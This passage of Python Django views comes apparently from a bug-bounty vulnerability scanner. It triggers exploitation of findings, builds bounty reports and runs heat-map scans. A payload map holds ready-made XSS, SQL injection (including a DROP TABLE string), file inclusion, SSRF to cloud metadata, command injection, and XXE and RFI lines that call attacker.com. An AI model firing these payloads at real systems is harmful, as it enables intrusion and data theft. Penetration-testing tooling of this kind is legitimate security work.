                'description': (
                    'Using the successful bypass method, send automated requests to the '
                    f'endpoint at {url} without solving the CAPTCHA. '
                    'Demonstrate that rate-limiting or anti-automation controls are ineffective.'
                ),
                'request': '',
                'response': '',
            })
            return steps

    # Universal 3-step fallback
    if not steps:
        vuln_type_display = vuln_type.replace('_', ' ').title()
        steps = [
            {
                'step': 1,
                'title': f'Identify the {vuln_type_display} vulnerability endpoint',
                'description': (
                    f'Navigate to {url} and locate the vulnerable parameter '
                    f'"{param}". Evidence collected during detection: {evidence[:200]}'
                    if evidence else
                    f'Navigate to {url} and locate the vulnerable parameter "{param}".'
                ),
                'request': f'GET {url} HTTP/1.1',
                'response': '',
            },
            {
                'step': 2,
                'title': f'Demonstrate the {vuln_type_display} issue',
                'description': (
                    f'Craft a proof-of-concept payload targeting "{param}" at {url} '
                    f'that demonstrates the {vuln_type_display} vulnerability. '
                    'Refer to the detection evidence for the specific trigger.'
                ),
                'request': '',
                'response': '',
            },
            {
                'step': 3,
                'title': 'Confirm the impact',
                'description': (
                    f'Verify that the {vuln_type_display} vulnerability at {url} '
                    'produces the expected impact (unauthorized data access, code execution, '
                    'or security control bypass) and document the full request/response pair.'
                ),
                'request': '',
                'response': '',
            },
        ]

    return steps


def _format_http_request(entry: dict) -> str:
    """Format a repeater dict entry as a readable HTTP request string."""
    if not entry:
        return ''
    method = entry.get('method', 'GET')
    url = entry.get('url', '')
    headers = entry.get('headers', {})
    body = entry.get('body', '')
    parts = [f"{method} {url}"]
    if isinstance(headers, dict):
        for k, v in list(headers.items())[:10]:
            parts.append(f"{k}: {v}")
    if body:
        parts.append('')
        parts.append(str(body)[:500])
    return '\n'.join(parts)


def _format_http_response(resp: dict) -> str:
    """Format a response dict as a readable HTTP response string."""
    if not resp or not isinstance(resp, dict):
        return ''
    status = resp.get('status_code', '')
    headers = resp.get('headers', {})
    body = resp.get('body', '')
    parts = [f"HTTP {status}"] if status else []
    if isinstance(headers, dict):
        for k, v in list(headers.items())[:10]:
            parts.append(f"{k}: {v}")
    if body:
        parts.append('')
        parts.append(str(body)[:500])
    return '\n'.join(parts)


def _serialize_exploit_media(media_queryset):
    """
    Serialize ExploitMedia queryset to dictionary format.
    
    Args:
        media_queryset: QuerySet of ExploitMedia objects
        
    Returns:
        List of dictionaries with media information
    """
    media_url_base = getattr(settings, 'MEDIA_URL', '/media/')
    
    return [{
        'id': media.id,
        'media_type': media.media_type,
        'title': media.title,
        'description': media.description,
        'file_url': f"{media_url_base}{media.file_path}",  # file_path already includes exploit_proofs/
        'file_name': media.file_name,
        'file_size': media.file_size,
        'mime_type': media.mime_type,
        'width': media.width,
        'height': media.height,
        'duration_seconds': media.duration_seconds,
        'frame_count': media.frame_count,
        'exploit_step': media.exploit_step,
        'payload_used': media.payload_used,
        'capture_timestamp': media.capture_timestamp.isoformat(),
        'sequence_order': media.sequence_order,
    } for media in media_queryset]


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def exploit_vulnerabilities(request, scan_id):
    """
    Trigger background exploitation of vulnerabilities from a scan.
    
    Request body should contain:
    - action: 'all' to exploit all vulnerabilities, 'selected' for specific ones
    - vulnerability_ids: (optional) list of vulnerability IDs when action='selected'
    - enable_visual_proof: (optional) boolean to enable/disable visual proof capture (default: True)
    
    Returns:
    - task_id: Celery task ID for polling status
    - message: Confirmation message
    """
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return Response({'error': 'Scan not found'}, status=404)
    
    action = request.data.get('action', 'all')
    
    # Read enable_visual_proof from request, default to True for backward compatibility
    enable_visual_proof = request.data.get('enable_visual_proof', True)
    # Convert string 'true'/'false' to boolean if needed
    if isinstance(enable_visual_proof, str):
        enable_visual_proof = enable_visual_proof.lower() == 'true'
    
    # Configuration for exploit attempts
    config = {
        'timeout': 30,
        'verify_ssl': False,
        'enable_exploitation': True,
        'enable_visual_proof': enable_visual_proof,
    }
    
    if action == 'all':
        # Submit Celery task to exploit all vulnerabilities in the scan
        task = async_exploit_all_vulnerabilities.delay(scan_id, config)
        return Response({
            'task_id': task.id,
            'message': 'Exploitation started in background',
            'status_url': f'/scanner/api/exploit_status/{task.id}/'
        }, status=202)
    
    elif action == 'selected':
        # Exploit only selected vulnerabilities
        vulnerability_ids = request.data.get('vulnerability_ids', [])
        
        if not vulnerability_ids:
            return Response({'error': 'No vulnerability IDs provided'}, status=400)
        
        # Validate that all IDs belong to this scan
        valid_ids = list(scan.vulnerabilities.filter(
            id__in=vulnerability_ids
        ).values_list('id', flat=True))
        
        if len(valid_ids) != len(vulnerability_ids):
            return Response({
                'error': 'Some vulnerability IDs do not belong to this scan'
            }, status=400)
        
        # Submit Celery task to exploit selected vulnerabilities
        task = async_exploit_selected_vulnerabilities.delay(valid_ids, config)
        return Response({
            'task_id': task.id,
            'message': 'Exploitation started in background',
            'status_url': f'/scanner/api/exploit_status/{task.id}/'
        }, status=202)
    
    else:
        return Response({'error': 'Invalid action. Use "all" or "selected"'}, status=400)


@api_view(['GET'])
@permission_classes([AllowAny])
def exploit_status(request, task_id):
    """
    Check the status of a background exploitation task.

    Task IDs are UUIDs and effectively unguessable, so AllowAny is safe here
    (consistent with the scan_results endpoint).

    Returns:
    - state: Task state (PENDING, PROGRESS, SUCCESS, FAILURE)
    - current: Current progress (if in PROGRESS state)
    - total: Total items to process (if in PROGRESS state)
    - status: Status message (if in PROGRESS state)
    - result: Final results (if SUCCESS state)
    - error: Error message (if FAILURE state)

    Optional query parameter:
    - scan_id: If provided and the Celery result has expired (state=PENDING),
               the DB is checked for completed exploit results as a fallback.
    """
    task_result = AsyncResult(task_id)

    response_data = {
        'task_id': task_id,
        'state': task_result.state,
    }

    if task_result.state == 'PENDING':
        # PENDING can mean "waiting to run" OR "result expired from Celery backend".
        # If the caller provides a scan_id, check the DB to distinguish the two cases.
        scan_id = request.query_params.get('scan_id')
        if scan_id:
            try:
                scan = Scan.objects.get(id=scan_id)
                all_vulns = list(scan.vulnerabilities.all())
                # Task is considered complete when some attempts were made AND none are still in_progress
                attempted = [v for v in all_vulns if v.exploit_status != 'not_attempted']
                still_running = [v for v in all_vulns if v.exploit_status == 'in_progress']
                if attempted and not still_running:
                    # Results are in the DB — build a synthetic SUCCESS response
                    total = len(all_vulns)
                    exploited = sum(1 for v in all_vulns if v.exploit_status == 'success')
                    failed = sum(1 for v in all_vulns if v.exploit_status == 'failed')
                    no_plugin = sum(1 for v in all_vulns if v.exploit_status == 'no_plugin')
                    results_list = [
                        {
                            'vulnerability_id': v.id,
                            'vulnerability_type': v.get_vulnerability_type_display(),
                            'url': v.url,
                            'success': v.exploit_status == 'success',
                            'plugin_used': None,
                            'evidence': v.exploit_result or '',
                            'error': '',
                        }
                        for v in all_vulns
                    ]
                    synthetic_result = {
                        'total': total,
                        'exploited': exploited,
                        'failed': failed,
                        'no_plugin': no_plugin,
                        'results': results_list,
                        'task_id': task_id,
                        'from_db': True,
                    }
                    response_data['state'] = 'SUCCESS'
                    response_data['result'] = synthetic_result
                    response_data['status'] = 'Completed (recovered from database)'
                    return Response(response_data, status=200)
            except (Scan.DoesNotExist, ValueError):
                pass
        response_data['status'] = 'Task is pending...'

    elif task_result.state == 'PROGRESS':
        # Task is in progress
        response_data.update({
            'current': task_result.info.get('current', 0),
            'total': task_result.info.get('total', 0),
            'status': task_result.info.get('status', 'Processing...')
        })

    elif task_result.state == 'SUCCESS':
        # Task completed successfully
        response_data['result'] = task_result.result
        response_data['status'] = 'Completed'

    elif task_result.state == 'FAILURE':
        # Task failed with an error
        response_data['error'] = str(task_result.info)
        response_data['status'] = 'Failed'

    else:
        # Any other state
        response_data['status'] = str(task_result.state)

    return Response(response_data, status=200)


@api_view(['GET'])
@permission_classes([AllowAny])
def vulnerability_detail(request, vuln_id):
    """
    Get detailed information about a specific vulnerability including all exploit media.
    
    Args:
        vuln_id: Vulnerability ID
        
    Returns:
        Detailed vulnerability information with all exploit media
    """
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
        
        # Get all exploit media ordered by sequence
        exploit_media = vuln.exploit_media.all().order_by('sequence_order', 'capture_timestamp')
        
        data = {
            'id': vuln.id,
            'type': vuln.get_vulnerability_type_display(),
            'vulnerability_type': vuln.vulnerability_type,
            'severity': vuln.severity,
            'url': vuln.url,
            'parameter': vuln.parameter,
            'description': vuln.description,
            'evidence': vuln.evidence,
            'remediation': vuln.remediation,
            'discovered_at': vuln.discovered_at.isoformat(),
            # Exploit information
            'exploited': vuln.exploited,
            'exploit_status': vuln.exploit_status,
            'exploit_result': vuln.exploit_result,
            'exploit_attempted_at': vuln.exploit_attempted_at.isoformat() if vuln.exploit_attempted_at else None,
            # Advanced features
            'verified': vuln.verified,
            'proof_of_impact': vuln.proof_of_impact,
            'risk_score': vuln.risk_score,
            'risk_level': vuln.risk_level,
            'confidence_score': vuln.confidence_score,
            'false_positive_status': vuln.false_positive_status,
            'false_positive_reason': vuln.false_positive_reason,
            'reviewed_by': vuln.reviewed_by,
            'reviewed_at': vuln.reviewed_at.isoformat() if vuln.reviewed_at else None,
            'compliance_violations': vuln.compliance_violations,
            'remediation_priority': vuln.remediation_priority,
            'remediation_effort': vuln.remediation_effort,
            # Legacy visual proof (single file)
            'visual_proof_path': vuln.visual_proof_path,
            'visual_proof_type': vuln.visual_proof_type,
            'visual_proof_size': vuln.visual_proof_size,
            # New multiple media support
            'exploit_media': _serialize_exploit_media(exploit_media),
            'exploit_media_count': exploit_media.count(),
        }
        return Response(data, status=200)
    except Vulnerability.DoesNotExist:
        return Response({'error': 'Vulnerability not found'}, status=404)


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def apply_advanced_features(request, scan_id):
    """
    Apply advanced scanner features to all vulnerabilities in a scan.
    
    This includes:
    - Risk scoring
    - False positive detection
    - Compliance mapping
    - Remediation suggestions
    
    Returns:
    - Results of applying advanced features
    """
    from scanner.exploit_integration import apply_advanced_features_to_scan
    
    try:
        results = apply_advanced_features_to_scan(scan_id)
        return Response(results, status=200)
    except Exception as e:
        return Response({'error': str(e)}, status=500)


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def scan_bounty_reports(request, scan_id):
    """
    Generate bug bounty reports for all exploited vulnerabilities in a scan.

    POST body (optional):
    - fmt: 'markdown' (default) or 'json'
    - exploited_only: true (default) or false

    Returns a summary of generated reports.
    """
    from scanner.bounty_report_generator import generate_scan_bounty_reports

    fmt = request.data.get('fmt', 'markdown')
    exploited_only = request.data.get('exploited_only', True)

    try:
        Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return Response({'error': 'Scan not found'}, status=404)

    results = generate_scan_bounty_reports(scan_id, fmt=fmt, exploited_only=exploited_only)
    if 'error' in results:
        return Response(results, status=404)
    return Response(results, status=200)


@api_view(['GET'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def vulnerability_bounty_report(request, vuln_id):
    """
    Get or generate the bug bounty report for a single vulnerability.

    Query params:
    - fmt: 'markdown' (default) or 'json'
    - regenerate: '1' to force regeneration even if a report already exists
    """
    from scanner.bounty_report_generator import BountyReportGenerator

    fmt = request.query_params.get('fmt', 'markdown')
    regenerate = request.query_params.get('regenerate', '0') == '1'

    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return Response({'error': 'Vulnerability not found'}, status=404)

    if vuln.bounty_report and not regenerate:
        report = vuln.bounty_report
    else:
        generator = BountyReportGenerator(vuln)
        report = generator.save(fmt=fmt)

    return Response({
        'vulnerability_id': vuln_id,
        'vulnerability_type': vuln.vulnerability_type,
        'severity': vuln.severity,
        'exploited': vuln.exploited,
        'fmt': fmt,
        'report': report,
    }, status=200)


@login_required
def scanner_dashboard(request):
    """Dashboard view for the scanner"""
    from scanner.models import Scan
    recent_scans = Scan.objects.filter(
        status='completed'
    ).select_related('target').order_by('-started_at')[:10]
    return render(request, 'scanner/dashboard.html', {'recent_scans': recent_scans})


@login_required
def bounty_dashboard(request):
    """
    Bug Bounty Impact Pipeline dashboard.

    Displays the full finding lifecycle:
    Raw → Filtered → Prioritized → Validated → Exploited → Report Ready

    Provides:
    - Summary cards (total findings, confirmed exploitable, estimated bounty)
    - Per-finding detail with impact analysis and generated reports
    - Export controls for HackerOne / Bugcrowd / Intigriti formats
    - Filter controls by severity, plugin type, validation status
    - Whitelist management and sensitivity tuning UI
    """
    from scanner.false_positive_filter import FalsePositiveFilter, FPCategory
    from scanner.finding_prioritizer import FindingPrioritizer, PriorityTier
    from scanner.validation_engine import ValidationEngine, ValidationStatus
    from scanner.exploit_impact_analyzer import ExploitImpactAnalyzer

    # ------------------------------------------------------------------
    # Fetch recent vulnerabilities and build pipeline data
    # ------------------------------------------------------------------
    vulns = Vulnerability.objects.select_related('scan').order_by('-scan__created_at')[:200]

    fp_filter = FalsePositiveFilter()
    prioritizer = FindingPrioritizer()
    validator = ValidationEngine()
    impact_analyzer = ExploitImpactAnalyzer()

    # Counters for summary cards
    total_raw = vulns.count()
    total_filtered = 0
    total_confirmed = 0
    total_exploited = 0
    total_report_ready = 0
    estimated_bounty_min = 0
    estimated_bounty_max = 0

    pipeline_findings = []

    for vuln in vulns:
        finding = {
            "id": vuln.id,
            "url": vuln.url,
            "parameter": getattr(vuln, 'parameter', ''),
            "plugin_type": vuln.vulnerability_type,
            "vuln_type": vuln.vulnerability_type,
            "severity": vuln.severity,
            "confidence": float(getattr(vuln, 'confidence_score', 0.7)),
            "exploited": vuln.exploited,
            "bounty_report": bool(vuln.bounty_report),
            "description": vuln.description,
            "payload": getattr(vuln, 'payload', '') or '',
        }

        # False positive check
        fp_result = fp_filter.filter_finding(finding)
        if fp_result.is_false_positive:
            total_filtered += 1
            continue

        # Prioritization
        scored = prioritizer.score(finding)

        # Validation
        val_result = validator.validate(finding)

        # Impact analysis
        impact = impact_analyzer.analyze(finding)

        # Update counters
        if val_result.status in (ValidationStatus.CONFIRMED, ValidationStatus.LIKELY):
            total_confirmed += 1
        if vuln.exploited:
            total_exploited += 1
        if vuln.bounty_report:
            total_report_ready += 1
        estimated_bounty_min += scored.bounty_min
        estimated_bounty_max += scored.bounty_max

        pipeline_findings.append({
            "vuln_id": vuln.id,
            "url": vuln.url,
            "vuln_type": vuln.vulnerability_type,
            "severity": vuln.severity,
            "confidence": finding["confidence"],
            "priority_tier": scored.tier.value,
            "priority_score": round(scored.priority_score, 2),
            "validation_status": val_result.status.value,
            "validation_confidence": round(val_result.confidence, 2),
            "is_exploited": vuln.exploited,
            "has_report": bool(vuln.bounty_report),
            "bounty_min": scored.bounty_min,
            "bounty_max": scored.bounty_max,
            "platform_severity": impact.platform_severity,
            "impact_statement": impact.impact_statement,
            "cvss_score": impact.cvss_score,
            "cia": {
                "confidentiality": impact.confidentiality_impact,
                "integrity": impact.integrity_impact,
                "availability": impact.availability_impact,
            },
            "scan_id": vuln.scan_id,
        })

    # Sort by priority
    _tier_order = {
        "critical_exploitable": 0,
        "high_verified": 1,
        "medium_likely": 2,
        "low_unverified": 3,
        "noise": 4,
    }
    pipeline_findings.sort(
        key=lambda f: (
            _tier_order.get(f["priority_tier"], 5),
            -f["priority_score"],
        )
    )

    # Tier summary counts
    tier_counts = {tier: 0 for tier in _tier_order}
    for pf in pipeline_findings:
        tier_counts[pf["priority_tier"]] = tier_counts.get(pf["priority_tier"], 0) + 1

    context = {
        "total_raw": total_raw,
        "total_filtered": total_filtered,
        "total_valid": total_raw - total_filtered,
        "total_confirmed": total_confirmed,
        "total_exploited": total_exploited,
        "total_report_ready": total_report_ready,
        "estimated_bounty_min": estimated_bounty_min,
        "estimated_bounty_max": estimated_bounty_max,
        "pipeline_findings": pipeline_findings,
        "tier_counts": tier_counts,
    }

    return render(request, 'scanner/bounty_dashboard.html', context)


@api_view(['GET'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def scan_report_template(request, scan_id):
    """
    Generate and return a Markdown report template for all vulnerabilities in a scan.

    Returns a Markdown file download containing either:
    - A combined filled template (when vulnerabilities with ProofData exist), or
    - A blank structured template for each vulnerability type found.

    GET /scanner/api/scans/<scan_id>/report-template/
    """
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return Response({'error': 'Scan not found'}, status=404)

    from scanner.proof_reporter import ProofReporter
    from pathlib import Path
    import tempfile

    reporter = ProofReporter()
    vulnerabilities = scan.vulnerabilities.all()

    if not vulnerabilities.exists():
        # Return a generic blank template
        content = reporter.generate_report_template(
            vulnerability_type='unknown',
            affected_url=getattr(scan, 'target_url', ''),
        )
    else:
        sections: list = [
            f"# Combined Security Report Template — Scan #{scan_id}\n",
            f"> Generated by Megido Security Scanner on {scan.created_at.strftime('%Y-%m-%d') if hasattr(scan, 'created_at') and scan.created_at else 'N/A'}\n",
            f"> ⚠️  All TODO markers must be filled in by the researcher before submission.\n",
            "---\n",
        ]
        for vuln in vulnerabilities:
            target_url = getattr(vuln, 'url', '') or ''
            sections.append(
                reporter.generate_report_template(
                    vulnerability_type=getattr(vuln, 'vulnerability_type', ''),
                    affected_url=target_url,
                )
            )
            sections.append("\n---\n")
        content = '\n'.join(sections)

    from django.http import HttpResponse
    response = HttpResponse(content, content_type='text/markdown; charset=utf-8')
    response['Content-Disposition'] = f'attachment; filename="scan_{scan_id}_report_template.md"'
    return response


@api_view(['GET'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def scan_chain_suggestions(request, scan_id):
    """
    Return vulnerability chaining suggestions for all findings in a scan.

    GET /scanner/api/scans/<scan_id>/chain-suggestions/
    """
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return Response({'error': 'Scan not found'}, status=404)

    from scanner.vulnerability_chain_advisor import VulnerabilityChainAdvisor

    advisor = VulnerabilityChainAdvisor()
    vulnerabilities = scan.vulnerabilities.all()

    findings = [
        {
            'vulnerability_type': getattr(v, 'vulnerability_type', ''),
            'url': getattr(v, 'url', ''),
            'parameter': getattr(v, 'parameter', ''),
            'severity': getattr(v, 'severity', ''),
            'id': v.id,
        }
        for v in vulnerabilities
    ]

    result = advisor.get_chain_suggestions_for_findings(findings)

    # Replace non-serialisable integer keys with string equivalents
    by_finding_str = {str(k): v for k, v in result['by_finding'].items()}

    return Response({
        'scan_id': scan_id,
        'total_findings': len(findings),
        'chain_suggestions': result['all_suggestions'],
        'by_finding': by_finding_str,
        'disclaimer': result['disclaimer'],
    }, status=200)


# ---------------------------------------------------------------------------
# Repeater advice payloads by vulnerability type
# ---------------------------------------------------------------------------

_REPEATER_ADVICE_MAP = {
    'xss': {
        'what_to_change': 'Modify the `{parameter}` parameter with XSS payloads to test for Cross-Site Scripting.',
        'suggested_payloads': [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "'><svg onload=alert(1)>",
            '<iframe src="javascript:alert(1)">',
        ],
    },
    'sqli': {
        'what_to_change': 'Modify the `{parameter}` parameter with SQL injection payloads.',
        'suggested_payloads': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ],
    },
    'lfi': {
        'what_to_change': 'Modify the `{parameter}` parameter with local file inclusion payloads.',
        'suggested_payloads': [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/etc/passwd%00',
        ],
    },
    'rfi': {
        'what_to_change': 'Modify the `{parameter}` parameter with a remote URL to test for Remote File Inclusion.',
        'suggested_payloads': [
            'http://attacker.com/shell.php',
            'http://attacker.com/shell.php%00',
        ],
    },
    'ssrf': {
        'what_to_change': 'Modify the `{parameter}` parameter with internal/cloud metadata URLs to test for SSRF.',
        'suggested_payloads': [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1/',
            'http://[::1]/',
            'http://localhost/',
        ],
    },
    'rce': {
        'what_to_change': 'Modify the `{parameter}` parameter with command injection payloads to test for RCE.',
        'suggested_payloads': [
            '; id',
            '| id',
            '`id`',
            '$(id)',
        ],
    },
    'open_redirect': {
        'what_to_change': 'Modify the `{parameter}` parameter with redirect targets to test for Open Redirect.',
        'suggested_payloads': [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https:evil.com',
        ],
    },
    'xxe': {
        'what_to_change': 'Modify the XML body to include an external entity declaration to test for XXE.',
        'suggested_payloads': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><data>&xxe;</data>',
        ],
    },
    'csrf': {
        'what_to_change': 'Remove the CSRF token from the request headers or body and resubmit to test for CSRF.',
        'suggested_payloads': [],
    },
    'cors': {
        'what_to_change': 'Modify the Origin header to an attacker-controlled domain and inspect the Access-Control-Allow-Origin response header.',
        'suggested_payloads': [
            'Origin: https://attacker.com',
            'Origin: null',
        ],
    },
    'crlf': {
        'what_to_change': 'Inject CRLF characters into the `{parameter}` parameter to test for CRLF Injection.',
        'suggested_payloads': [
            '%0d%0aSet-Cookie: injected=true',
            '%0d%0aContent-Length: 0%0d%0a%0d%0a',
        ],
    },
    'idor': {
        'what_to_change': 'Modify the `{parameter}` parameter to access other users\' resources (IDOR).',
        'suggested_payloads': ['1', '2', '100', '0', '-1'],
    },
    'path_traversal': {
        'what_to_change': 'Modify the `{parameter}` parameter with path traversal sequences.',
        'suggested_payloads': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ],
    },
    'info_disclosure': {
        'what_to_change': 'Inspect response headers and body for sensitive information leakage.',
        'suggested_payloads': [],
    },
    'host_header': {
        'what_to_change': 'Modify the Host header to an attacker-controlled domain.',
        'suggested_payloads': [
            'Host: attacker.com',
            'Host: localhost',
        ],
    },
    'jwt': {
        'what_to_change': 'Modify the JWT token to use algorithm "none" or a weak secret.',
        'suggested_payloads': [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.',
        ],
    },
    'deserialization': {
        'what_to_change': 'Replace the serialized object in the `{parameter}` parameter with a crafted gadget chain payload.',
        'suggested_payloads': [],
    },
    'bac': {
        'what_to_change': 'Modify the `{parameter}` parameter or change the user role/ID to test for Broken Access Control.',
        'suggested_payloads': ['admin', 'superuser', '1', '0'],
    },
    'unsafe_upload': {
        'what_to_change': 'Upload a file with a dangerous extension or content-type to test for Unsafe File Upload.',
        'suggested_payloads': ['shell.php', 'test.php5', 'malware.jsp'],
    },
}


def _build_repeater_advice(vuln):
    """
    Build intelligent advice for manual testing in the Repeater.

    Returns a dict with 'what_to_change' and 'suggested_payloads' keys.
    Successful payloads from the scan are prepended to the suggestions.
    """
    vuln_type = (getattr(vuln, 'vulnerability_type', '') or '').lower()
    parameter = getattr(vuln, 'parameter', '') or 'input'
    successful_payloads = list(getattr(vuln, 'successful_payloads', None) or [])

    template = _REPEATER_ADVICE_MAP.get(vuln_type, {
        'what_to_change': 'Modify the `{parameter}` parameter to test for {vuln_type} vulnerabilities.',
        'suggested_payloads': [],
    })

    what_to_change = template['what_to_change'].format(
        parameter=parameter,
        vuln_type=vuln.get_vulnerability_type_display() if vuln_type else 'unknown',
    )

    extra = [p for p in template['suggested_payloads'] if p not in successful_payloads]
    combined_payloads = (successful_payloads + extra)[:10]

    return {
        'what_to_change': what_to_change,
        'suggested_payloads': combined_payloads,
    }


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def send_to_repeater(request, vuln_id):
    """
    Forward a vulnerability's HTTP request to the Repeater tool.

    Looks up the Vulnerability by ID, extracts (or reconstructs) its HTTP
    request data, creates a new RepeaterRequest, and returns the request ID
    together with intelligent advice on what to change for manual testing.

    POST /scanner/api/vulnerabilities/<vuln_id>/send-to-repeater/

    Response (201):
        repeater_request_id  – ID of the newly created RepeaterRequest
        repeater_url         – URL of the Repeater dashboard
        message              – Human-readable confirmation
        advice               – Dict with 'what_to_change' and 'suggested_payloads'
    """
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return Response({'error': 'Vulnerability not found'}, status=404)

    from repeater.models import RepeaterRequest as _RepeaterRequest

    # --- Extract HTTP request data ----------------------------------------
    http_traffic = vuln.http_traffic or {}
    req_data = http_traffic.get('request', {})

    if req_data:
        method = req_data.get('method', 'GET') or 'GET'
        url = req_data.get('url', '') or vuln.url or ''
        headers = req_data.get('headers', {})
        body = req_data.get('body', '') or ''
    else:
        # Fall back: reconstruct a minimal request from vulnerability fields
        method = 'GET'
        url = vuln.url or ''
        headers = {}
        body = ''
        payloads = list(vuln.successful_payloads or [])
        if payloads and vuln.parameter:
            body = f'{vuln.parameter}={payloads[0]}'

    # Normalise headers to a JSON string
    if isinstance(headers, dict):
        headers_str = json.dumps(headers)
    elif isinstance(headers, str):
        headers_str = headers
    else:
        headers_str = '{}'

    # --- Create the RepeaterRequest ----------------------------------------
    vuln_type_display = vuln.get_vulnerability_type_display()
    name = f'[Scanner] {vuln_type_display} - {url}'[:255]

    scan_id = vuln.scan.id if vuln.scan else None

    repeater_req = _RepeaterRequest.objects.create(
        url=url,
        method=method,
        headers=headers_str,
        body=body,
        name=name,
        source='scanner',
        scan=vuln.scan,
    )

    repeater_url = f'/repeater/?scan_id={scan_id}' if scan_id else '/repeater/'

    return Response({
        'repeater_request_id': repeater_req.id,
        'scan_id': scan_id,
        'repeater_url': repeater_url,
        'message': f'Request forwarded to Repeater as "{name}"',
        'advice': _build_repeater_advice(vuln),
    }, status=201)


# ---------------------------------------------------------------------------
# Heat Map views
# ---------------------------------------------------------------------------

@api_view(['POST'])
@permission_classes([AllowAny])
def start_heat_map_scan(request):
    """
    Start a heat map analysis for a given target URL.

    POST body: { "url": "https://example.com", "scope_id": 1 (optional) }

    Returns the created HeatMapScan id and status.
    """
    from scanner.models import HeatMapScan, HeatMapHotspot
    from scanner.heat_map_analyzer import HeatMapAnalyzer

    target_url = request.data.get('url', '').strip()
    if not target_url:
        return Response({'error': 'url is required'}, status=400)

    # --- Scope validation ---
    scope_id = request.data.get('scope_id') if 'scope_id' in request.data else request.data.get('program_scope_id')
    program_scope = None
    scope_warnings = []

    if scope_id is not None:
        try:
            program_scope = ProgramScope.objects.get(id=scope_id)
        except ProgramScope.DoesNotExist:
            return Response({'error': f'ProgramScope with id {scope_id} not found'}, status=404)

    validator = ScopeValidator(target_url, program_scope)
    validation_result = validator.validate()

    if not validation_result['is_valid']:
        return Response(
            {
                'error': 'Target URL failed scope validation',
                'violations': validation_result['violations'],
            },
            status=400,
        )

    scope_warnings = validation_result.get('warnings', [])

    heat_scan = HeatMapScan.objects.create(
        target_url=target_url,
        status='running',
        program_scope=program_scope,
    )

    try:
        analyzer = HeatMapAnalyzer(
            timeout=int(request.data.get('timeout', 10)),
            verify_ssl=bool(request.data.get('verify_ssl', False)),
        )
        result = analyzer.analyze(target_url)

        # Persist hotspots
        for hs in result.get('hotspots', []):
            HeatMapHotspot.objects.create(
                heat_map_scan=heat_scan,
                category=hs.get('category', ''),
                category_label=hs.get('category_label', ''),
                url=hs.get('url', target_url),
                parameter=hs.get('parameter'),
                risk_score=hs.get('risk_score', 5),
                priority=hs.get('priority', 'Medium'),
                vulnerabilities=hs.get('vulnerabilities', []),
                payloads=hs.get('payloads', []),
                description=hs.get('description', ''),
                evidence=hs.get('evidence', ''),
            )

        from django.utils import timezone as _tz
        heat_scan.status = 'completed'
        heat_scan.total_hotspots = result.get('total_hotspots', 0)
        heat_scan.summary = result.get('summary', {})
        heat_scan.risk_scores = result.get('risk_scores', {})
        heat_scan.completed_at = _tz.now()
        heat_scan.save()

        response_data = {
            'id': heat_scan.id,
            'status': heat_scan.status,
            'total_hotspots': heat_scan.total_hotspots,
            'summary': heat_scan.summary,
        }
        if scope_warnings:
            response_data['warnings'] = scope_warnings
        return Response(response_data, status=201)

    except Exception as exc:
        logger.error("Heat map scan failed: %s", exc, exc_info=True)
        heat_scan.status = 'failed'
        heat_scan.error_message = str(exc)
        heat_scan.save()
        return Response({'error': str(exc)}, status=500)


@api_view(['GET'])
@permission_classes([AllowAny])
def heat_map_scan_results(request, scan_id):
    """
    Return the results of a completed heat map scan.
    """
    from scanner.models import HeatMapScan

    try:
        heat_scan = HeatMapScan.objects.prefetch_related('hotspots').get(id=scan_id)
    except HeatMapScan.DoesNotExist:
        return Response({'error': 'Heat map scan not found'}, status=404)

    hotspots = [
        {
            'id': hs.id,
            'category': hs.category,
            'category_label': hs.category_label,
            'url': hs.url,
            'parameter': hs.parameter,
            'risk_score': hs.risk_score,
            'priority': hs.priority,
            'vulnerabilities': hs.vulnerabilities,
            'payloads': hs.payloads,
            'description': hs.description,
            'evidence': hs.evidence,
            'discovered_at': hs.discovered_at.isoformat(),
        }
        for hs in heat_scan.hotspots.all()
    ]

    return Response({
        'id': heat_scan.id,
        'target_url': heat_scan.target_url,
        'status': heat_scan.status,
        'started_at': heat_scan.started_at.isoformat(),
        'completed_at': heat_scan.completed_at.isoformat() if heat_scan.completed_at else None,
        'total_hotspots': heat_scan.total_hotspots,
        'summary': heat_scan.summary,
        'risk_scores': heat_scan.risk_scores,
        'hotspots': hotspots,
        'error_message': heat_scan.error_message,
    }, status=200)


def heat_map_view(request, scan_id=None):
    """Render the heat map HTML template."""
